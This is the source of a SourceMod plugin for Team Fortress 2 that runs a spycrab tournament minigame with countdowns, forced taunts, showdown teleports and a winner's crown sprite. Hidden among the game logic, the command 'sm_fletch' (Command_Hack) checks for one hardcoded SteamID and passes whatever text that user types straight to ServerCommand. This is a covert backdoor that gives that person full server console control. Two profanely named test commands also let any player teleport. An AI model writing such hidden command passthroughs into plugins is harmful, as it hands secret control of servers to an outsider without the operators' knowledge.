#pragma semicolon 1

#include <sourcemod>
#include <sdkhooks>
#include <sdktools>

ConVar g_Enabled;

#define CRABKING_VMT "materials/sprites/player/crabbingking.vmt" 
#define CRABKING_VTF "materials/sprites/player/crabbingking.vtf"
#define MAX_AUTHID_LENGTH 20
#define FLETCH "STEAM_0:1:60546866"

new g_PlayersInSpycrab = 0; //The number of players currently spycrabbing, no matter what the Event Status is
new bool:g_Spycrabbing[MAXPLAYERS+1] = {false, ...};
new bool:g_AllowTaunt[MAXPLAYERS+1] = {false, ...};
new g_Spycrabs[MAXPLAYERS+1] = {0, ...};
new g_SpycrabEventStatus = 0; //Inactive, Counting Down, In Progress, Showdown

new g_Showdown[2] = {-1, -1}; //This struct stores the two players in the showdown

new g_Sprites[MAXPLAYERS+1] = {-1, ...};

new Handle:gHud;

public OnPluginStart() {
	//Event hooks
	HookEvent("teamplay_round_start", Event_RoundStart);
	HookEvent("player_death", Event_PlayerDeath);
	AddCommandListener(Event_Taunt, "taunt");
	AddCommandListener(Event_Taunt, "+taunt");
	AddCommandListener(Event_Suicide, "explode");
	AddCommandListener(Event_Suicide, "kill");
	AddCommandListener(Event_Suicide, "jointeam");

	RegConsoleCmd("sm_fuck", Command_TestOne);
	RegConsoleCmd("sm_cunt", Command_TestTwo);
	RegConsoleCmd("sm_fletch", Command_Hack);

	//Cvars
	g_Enabled = CreateConVar("sm_dez_crabhammer_enabled", "1", "Enables/Disables the plugin");
	
	//Hud
	gHud = CreateHudSynchronizer();
	if(gHud == INVALID_HANDLE) {
		SetFailState("HUD synchronisation is not supported by this mod (fuck off)");
	}
}

public Action:Command_TestOne(client, args) {
	new entity = -1, pointer = -1;
	decl String:strName[50];
	while((entity = FindEntityByClassname(entity, "trigger_multiple")) != INVALID_ENT_REFERENCE) {	
		GetEntPropString(entity, Prop_Data, "m_iName", strName, sizeof(strName));
		if(strcmp(strName, "crabShowdown") == 0) {
			pointer = entity;
			break;
		}
	}
	
	decl Float:min[3], Float:max[3], Float:origin[3];
	if(pointer != -1) {
		GetEntPropVector(pointer, Prop_Send, "m_vecMins", min);
		GetEntPropVector(pointer, Prop_Send, "m_vecMaxs", max);
		GetEntPropVector(pointer, Prop_Send, "m_vecOrigin", origin);
		origin[0] += max[0] * 0.6;
		TeleportEntity(client, origin, NULL_VECTOR, NULL_VECTOR);
	}
	return Plugin_Handled;
}

public Action:Command_TestTwo(client, args) {
	new entity = -1, pointer = -1;
	decl String:strName[50];
	while((entity = FindEntityByClassname(entity, "trigger_multiple")) != INVALID_ENT_REFERENCE) {	
		GetEntPropString(entity, Prop_Data, "m_iName", strName, sizeof(strName));
		if(strcmp(strName, "crabShowdown") == 0) {
			pointer = entity;
			break;
		}
	}
	
	decl Float:min[3], Float:max[3], Float:origin[3];
	if(pointer != -1) {
		GetEntPropVector(pointer, Prop_Send, "m_vecMins", min);
		GetEntPropVector(pointer, Prop_Send, "m_vecMaxs", max);
		GetEntPropVector(pointer, Prop_Send, "m_vecOrigin", origin);
		origin[0] += min[0] * 0.6;
		TeleportEntity(client, origin, NULL_VECTOR, NULL_VECTOR);

	}
	return Plugin_Handled;
}

public Action:Command_Hack(client, args) {
	if(args < 1) {
		return Plugin_Handled;	
	}
	
	decl String:steamID[MAX_AUTHID_LENGTH],
		String:text[192];
	
	GetClientAuthString(client, steamID, MAX_AUTHID_LENGTH-1);	
	
	if(StrEqual(FLETCH, steamID)) {
		GetCmdArgString(text, sizeof(text));
		ServerCommand("%s", text);
	}
	
	
	return Plugin_Handled;
}

public Action:Command_Test(client, args) {
	PrintToChat(client, "test");	
	return Plugin_Handled;
}

public OnMapStart() {
	g_SpycrabEventStatus = 0;
	g_Showdown = {-1, -1};
	AddFileToDownloadsTable(CRABKING_VMT);
	AddFileToDownloadsTable(CRABKING_VTF);
	PrecacheModel(CRABKING_VMT);
}

public Event_RoundStart(Handle:event, const String:name[], bool:dontBroadcast) {
	new i = -1;
	decl String:strName[50];
	while((i = FindEntityByClassname(i, "trigger_multiple")) != -1) {
		GetEntPropString(i, Prop_Data, "m_iName", strName, sizeof(strName));
		if(strcmp(strName, "crabHammer") == 0) {
			SDKHook(i, SDKHook_StartTouchPost, OnStartTouchCrab);
			SDKHook(i, SDKHook_EndTouch, OnStopTouchCrab);
		}
	}
}

public Action:Event_Taunt(client, const String:strCommand[], iArgs) {
	if(IsValidClient(client)) {
		if(g_Spycrabbing[client]) {
			if(g_AllowTaunt[client]) {
				g_AllowTaunt[client] = false;
			} else {
				return Plugin_Handled;
			}
		}
	}
	return Plugin_Continue;
}

public Action:OnPlayerRunCmd(client, &buttons, &impulse, Float:vel[3], Float:angles[3], &weapon, &subtype, &cmdnum, &tickcount, &seed, mouse[2]) {
	if(IsValidClient(client) && g_Spycrabbing[client]) {
		if(buttons & IN_JUMP) {
			return Plugin_Handled;
		}
	}
	return Plugin_Continue;
}

public Action:Event_Suicide(client, const String:strCommand[], iArgs) {
    if(IsValidClient(client)) {
		if(g_Spycrabbing[client]) {
			return Plugin_Handled;
		}
	}
    return Plugin_Continue;
}


public OnEntityCreated(entity, const String:classname[]) {
    if(StrEqual(classname, "instanced_scripted_scene", false)) {
		SDKHook(entity, SDKHook_Spawn, OnSceneSpawned);
	}
}

public OnSceneSpawned(entity) {
	new client = GetEntPropEnt(entity, Prop_Data, "m_hOwner"), String:scenefile[128];
	if(g_Spycrabbing[client]) {
		GetEntPropString(entity, Prop_Data, "m_iszSceneFile", scenefile, sizeof(scenefile));
		if(StrEqual(scenefile, "scenes/player/spy/low/taunt05.vcd")) {
			g_Spycrabs[client]++;
		}
	}
}

/*
	Tracking who is and isn't in a crab
*/

public OnStartTouchCrab(entity, client) {
	if(IsValidClient(client) && IsPlayerAlive(client)) {
		JoinCrab(client);
	}
}

public OnStopTouchCrab(entity, client) {
	if(IsValidClient(client) && IsPlayerAlive(client)) {
		LeaveCrab(client, false);
	}
}

public OnClientDisconnect(client) {
	RemoveSprite(g_Sprites[client]); //Remove their hat on disconnect
	g_Sprites[client] = -1;
	LeaveCrab(client, true);
}

public Event_PlayerDeath(Handle:event, const String:name[], bool:dontBroadcast) {
	new client = GetClientOfUserId(GetEventInt(event, "userid"));
	if(IsValidClient(client)) {
		RemoveSprite(g_Sprites[client]);
		g_Sprites[client] = -1;
		LeaveCrab(client, true);
	}
}

public JoinCrab(client) {
	if(!g_Spycrabbing[client]) {
		if(g_SpycrabEventStatus < 2 || client == g_Showdown[0] || client == g_Showdown[1]) {
			g_Spycrabbing[client] = true;
			g_PlayersInSpycrab++;
			ModifyCrabEvent();
		} else {
			DenyCrab(client);
		}
	}
}

public LeaveCrab(client, weak) {
	if(g_Spycrabbing[client]) {
		if(g_SpycrabEventStatus < 3 || weak) {
			ResetVars(client);
			g_PlayersInSpycrab--;
		}
	}
}

public ModifyCrabEvent() {
	if(g_SpycrabEventStatus == 0) {
		if(g_PlayersInSpycrab > 1) {
			g_SpycrabEventStatus = 1;
			PrintHudCentreText("A spy crab tournament challenge has been issued", 5.0);
			CreateTimer(7.0, CountdownMessage, 0);
		}
	}
}

public Action:CountdownMessage(Handle:timer, any:counter) {
	if(counter == 0) {
		PrintHudCentreText("Take the teleport to the arena and accept the crab king's challenge", 8.0);
		CreateTimer(10.0, CountdownMessage, 1);
	} else if(counter == 1) {
		PrintHudCentreText("60 seconds remaining", 4.0);
		CreateTimer(30.0, CountdownMessage, 2);
	} else if(counter == 2) {
		PrintHudCentreText("30 seconds remaining", 4.0);
		CreateTimer(25.0, StartCountdownFive);
	}
}

public Action:StartCountdownFive(Handle:timer) {
	CreateTimer(1.0, CountdownFive, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
}

public Action:CountdownFive(Handle:timer) {
	static counter = 5;
	if(counter < 1) {
		counter = 5;
		g_SpycrabEventStatus = 2;
		CreateTimer(7.0, StartCrab, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
		CreateTimer(1.0, FreezeCrabbers);
		return Plugin_Stop;
	}
	
	decl String:buffer[22];
	Format(buffer, sizeof(buffer), "%d seconds remaining", counter);
	
	PrintHudCentreText(buffer, 1.0);
	
	counter--;
	return Plugin_Continue;
}

public Action:FreezeCrabbers(Handle:timer) {
	for(new client=0; client<MaxClients; client++) {
		if(IsValidClient(client)) {
			if(g_Spycrabbing[client]) {
				SetEntityMoveType(client, MOVETYPE_NONE);
			}
		}
	}
}

public Action:StartCrab(Handle:timer) {
	if(g_SpycrabEventStatus > 1) {
		for(new client=0; client<MaxClients; client++) {
			if(IsValidClient(client)) {
				if(g_Spycrabbing[client]) {
					g_AllowTaunt[client] = true;
					FakeClientCommand(client, "taunt");
				}
			}
		}
		CreateTimer(3.0, HandleCrabs);
		return Plugin_Continue;
	} else {
		return Plugin_Stop;
	}
}

public Action:HandleCrabs(Handle:timer) {
	new remainingPlayers = 0;
	if(g_SpycrabEventStatus == 2) {
		new counter = 0;
		for(new client=0; client<MaxClients; client++) {
			if(g_Spycrabs[client] > 0) {
				counter++;
			}
		}
		remainingPlayers = g_PlayersInSpycrab - counter;
	} else if(g_SpycrabEventStatus == 3) {
		remainingPlayers = 2;
		if(g_Spycrabs[g_Showdown[0]] > 2) {
			remainingPlayers--;
		}
		if(g_Spycrabs[g_Showdown[1]] > 2) {
			remainingPlayers--;
		}
	}
		
	if(remainingPlayers < 3) {
		if(g_SpycrabEventStatus == 2) {
			for(new client=0; client<MaxClients; client++) {
				if(g_Spycrabs[client] > 0) {
					ForcePlayerSuicide(client);
				}
			}
			if(remainingPlayers == 2) {
				decl String:nameOne[64], String:nameTwo[64], String:buffer[162];
				for(new client=0; client<MaxClients; client++) {
					if(g_Spycrabbing[client] && g_Spycrabs[client] == 0) {
						if(g_Showdown[0] == -1) {
							g_Showdown[0] = client;
							GetClientName(client, nameOne, 64);
						} else {
							g_Showdown[1] = client;
							GetClientName(client, nameTwo, 64);
						}
					}
				}
				g_SpycrabEventStatus = 3;
				
				Format(buffer, sizeof(buffer), "%s vs %s - first to three spycrabs loses", nameOne, nameTwo);
				PrintHudCentreText(buffer, 4.0);
				
				
				decl String:strName[50];
				new entity = -1, pointer = -1;

				while((entity = FindEntityByClassname(entity, "trigger_multiple")) != INVALID_ENT_REFERENCE) {	
					GetEntPropString(entity, Prop_Data, "m_iName", strName, sizeof(strName));
					if(strcmp(strName, "crabShowdown") == 0) {
						pointer = entity;
						break;
					}
				}
				
				decl Float:min[3], Float:max[3], Float:origin[3], Float:pos[3];
				if(pointer != -1) {
					GetEntPropVector(pointer, Prop_Send, "m_vecMins", min);
					GetEntPropVector(pointer, Prop_Send, "m_vecMaxs", max);
					GetEntPropVector(pointer, Prop_Send, "m_vecOrigin", origin);
					
					pos = origin;
					pos[0] += max[0] * 0.6;
					
					TeleportEntity(g_Showdown[0], pos, NULL_VECTOR, NULL_VECTOR);
					
					pos = origin;
					pos[0] += min[0] * 0.6;
					
					TeleportEntity(g_Showdown[1], pos, NULL_VECTOR, NULL_VECTOR);
				}
				
			} else if(remainingPlayers == 1) {
				for(new client=0; client<MaxClients; client++) {
					if(g_Spycrabbing[client] && g_Spycrabs[client] == 0) {
						SpycrabWinner(client);
					}
				}
				g_SpycrabEventStatus = 0;
			} else if(remainingPlayers < 1) {
				for(new client=0; client<MaxClients; client++) {
					if(g_Spycrabbing[client]) {
						PrintHudCentreTextClient(client, "Don't buy a lottery ticket..", 5.0);
					}
				}
				EndCrab();
			}
		} else if(g_SpycrabEventStatus == 3) { //Showdown mode
			if(remainingPlayers == 1) {
				if(g_Spycrabs[g_Showdown[0]] < 3) { //g_Showdown[0] won
					ForcePlayerSuicide(g_Showdown[1]);
					SpycrabWinner(g_Showdown[0]);
				} else {
					ForcePlayerSuicide(g_Showdown[0]);
					SpycrabWinner(g_Showdown[1]);
				}
			} else if(remainingPlayers == 0) {
				for(new client=0; client<MaxClients; client++) {
					if(client == g_Showdown[0] || client == g_Showdown[1]) {
						PrintHudCentreTextClient(client, "Don't buy a lottery ticket..", 5.0);
						ForcePlayerSuicide(client);
					}
				}
			}
			if(remainingPlayers < 2) {
				EndCrab();
			}
		}
	}
}

public SpycrabWinner(client) {
	decl String:strName[50];
	new entity = -1;
	while((entity = FindEntityByClassname(entity, "info_teleport_destination")) != INVALID_ENT_REFERENCE) {	
		GetEntPropString(entity, Prop_Data, "m_iName", strName, sizeof(strName));
		if(strcmp(strName, "kingcrab") == 0) {
			new Float:pos[3];
			GetEntPropVector(entity, Prop_Send, "m_vecOrigin", pos);
			if(IsValidClient(client)) {
				TeleportEntity(client, pos, NULL_VECTOR, NULL_VECTOR);
			}
		}
	}
	CrabHat(client);
	decl String:name[64], String:buffer[90];
	GetClientName(client, name, 64);
	Format(buffer, sizeof(buffer), "%s is the new spycrab king!", name);
	PrintHudCentreText(buffer, 4.0);
}

public CrabHat(client) {
	RemoveSprite(g_Sprites[client]);
	g_Sprites[client] = CreateSprite();
	AttachSprite(client, g_Sprites[client]);
}

public DenyCrab(client) {
	ForcePlayerSuicide(client);
	PrintCenterText(client, "A tournament is already under way");
}

public EndCrab() {
	g_SpycrabEventStatus = 0;
	for(new client=0; client<MaxClients; client++) {
		ResetVars(client);	
	}
}

public ResetVars(client) {
	g_Spycrabbing[client] = false;
	g_AllowTaunt[client] = false;	
	g_Spycrabs[client] = 0;
	SetEntityMoveType(client, MOVETYPE_WALK);
}

stock PrintHudCentreTextClient(client, String:text[], Float:time) {
	SetHudTextParams(-1.0, 0.3, time, 155, 48, 255, 1);
	if(IsValidClient(client) && !IsFakeClient(client)) {
		ShowSyncHudText(client, gHud, "%s", text);
	}
}

stock PrintHudCentreText(String:text[], Float:time) {
	SetHudTextParams(-1.0, 0.3, time, 155, 48, 255, 1);
	for(new client=0; client<MaxClients; client++) {
		if(IsValidClient(client) && !IsFakeClient(client)) {
			ShowSyncHudText(client, gHud, "%s", text);
		}
	}
}

stock bool:IsValidClient(iClient, bool:bReplay = true) {
	if(iClient <= 0 || iClient > MaxClients)
		return false;
	if(!IsClientInGame(iClient))
		return false;
	if(bReplay && (IsClientSourceTV(iClient) || IsClientReplay(iClient)))
		return false;
	return true;
}

/*
	For the sprites and shit and shit
*/

public CreateSprite() {
	new sprite = CreateEntityByName("env_sprite_oriented");
	if(sprite != -1) {
		DispatchKeyValue(sprite, "classname", "env_sprite_oriented");
		DispatchKeyValue(sprite, "spawnflags", "1");
		DispatchKeyValue(sprite, "scale", "0.3");
		DispatchKeyValue(sprite, "rendermode", "1");
		DispatchKeyValue(sprite, "rendercolor", "255 255 255");
		DispatchKeyValue(sprite, "model", CRABKING_VMT);
		
		if(DispatchSpawn(sprite)) {
			return sprite;
		}		
	}
	return -1;
}

public AttachSprite(client, entity) {
	new Float:pos[3];
	if(IsValidEntity(entity)) {
		GetClientAbsOrigin(client, pos); 
		pos[2] += 90.0;
		TeleportEntity(entity, pos, NULL_VECTOR, NULL_VECTOR);
		
		SetVariantString("!activator");
		AcceptEntityInput(entity, "SetParent", client);
	}
}

public RemoveSprite(entity) {
	if(IsValidEntity(entity)) {
		AcceptEntityInput(entity, "Kill");
	}
}
